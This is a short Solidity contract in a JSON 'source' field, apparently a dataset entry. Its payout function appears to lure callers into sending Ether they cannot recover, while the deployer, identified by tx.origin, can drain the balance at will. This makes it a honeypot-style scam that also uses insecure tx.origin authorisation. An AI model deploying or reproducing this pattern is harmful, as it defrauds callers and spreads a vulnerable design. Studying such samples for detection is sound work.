  "source": "\n\ncontract GrungeTuesday\n{\n    address O = tx.origin;\n\n    function() public payable {}\n\n    function multi_x() public payable {\n        if (msg.value >= this.balance || tx.origin == O) {\n            selfdestruct(tx.origin);\n        }\n    }\n }",
